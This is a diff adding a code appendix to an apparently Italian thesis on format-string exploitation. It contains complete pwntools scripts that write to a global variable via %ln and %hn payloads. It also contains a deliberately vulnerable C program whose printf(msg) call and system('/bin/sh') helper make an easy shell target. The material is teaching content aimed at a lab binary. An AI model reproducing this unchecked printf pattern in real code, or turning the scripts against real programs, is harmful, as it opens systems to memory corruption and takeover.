@@ -1,2 +1,82 @@
-\chapter{Appendice di Esempio}
-\Blindtext
+\chapter{Codice sorgente}\label{app:source}
+In questa appendice sono raccolte, nella loro forma completa ed eseguibile, le parti di codice che nel corpo del testo sono state mostrate solo tramite estratti o, nel caso del programma discusso nel Capitolo~\ref{chapter:exploit}, tramite il solo codice decompilato. Non introducono alcuna tecnica nuova rispetto a quanto già spiegato: assemblano soltanto per intero ciò che nelle sezioni indicate in ciascuna didascalia è stato costruito un pezzo alla volta. 
+
+
+\section{Script del Capitolo~\ref{chapter:fmt_vuln}}\label{sec:app_cap2}
+Il Codice~\ref{lst:app_write_script} riporta la versione completa dello script per la scrittura di \texttt{global\_secret} tramite \texttt{\%ln}, il cui frammento essenziale --- la costruzione del payload --- è già mostrato nel Codice~\ref{lst:python_write} (Sezione~\ref{sec:mem_write}).
+\begin{lstlisting}[
+    language=Python,
+    gobble=4,
+    caption={Script completo per la scrittura di \texttt{global\_secret} con \texttt{\%ln} (Sezione~\ref{sec:mem_write})},
+    label={lst:app_write_script}
+]
+    from pwn import *
+
+    exe = ELF('./write_demo')
+    context.binary = exe
+    io = exe.process()
+
+    payload = b'%4919x' \
+                + b'%8$ln' \
+                + b'\x00' * 5 \
+                + p64(0x404050)
+    io.sendline(payload)
+
+    io.interactive()
+\end{lstlisting}
+
+Il Codice~\ref{lst:app_partial_write_script} riporta la versione completa dello script per la scrittura parziale di \texttt{global\_secret} tramite \texttt{\%hn}, il cui frammento essenziale è già mostrato nel Codice~\ref{lst:python_partial_write} (Sezione~\ref{sec:partial_write}).
+\begin{lstlisting}[
+    language=Python,
+    gobble=4,
+    caption={Script completo per la scrittura parziale di \texttt{global\_secret} con \texttt{\%hn} (Sezione~\ref{sec:partial_write})},
+    label={lst:app_partial_write_script}
+]
+    from pwn import *
+
+    exe = ELF('./write_demo')
+    context.binary = exe
+    io = exe.process()
+
+    payload = b'%48879x' + b'%10$hn' \
+                + b'%8126x' + b'%11$hn' \
+                + b'\x00' * 7 \
+                + p64(0x404050) \
+                + p64(0x404050 + 2)            
+    io.sendline(payload)
+
+    io.interactive()
+\end{lstlisting}
+
+
+\section{Sorgente del Capitolo~\ref{chapter:exploit}}\label{sec:app_cap3}
+Il Codice~\ref{lst:app_vuln_source} riporta il sorgente completo del programma analizzato nel Capitolo~\ref{chapter:exploit}, in cui è mostrato solo il decompilato sistemato con Ghidra (Codice~\ref{lst:ghidra_decompiled}). È incluso qui per riproducibilità: nello scenario black-box del capitolo il sorgente non è mai a disposizione dell'attaccante, che dispone solo del binario.
+\begin{lstlisting}[
+    language=C,
+    gobble=4,
+    caption={Sorgente completo del programma analizzato nel Capitolo~\ref{chapter:exploit}},
+    label={lst:app_vuln_source}
+]
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    void debug_shell(void) {
+        system("/bin/sh");
+    }
+
+    void log_message(char *msg) {
+        printf(msg);
+    }
+
+    int main(void) {
+        char buf[64];
+
+        puts("=== MiniLog v1.0 ===");
+
+        while (fgets(buf, sizeof(buf), stdin) != NULL) {
+            log_message(buf);
+        }
+        
+        return 0;
+    }
+\end{lstlisting}
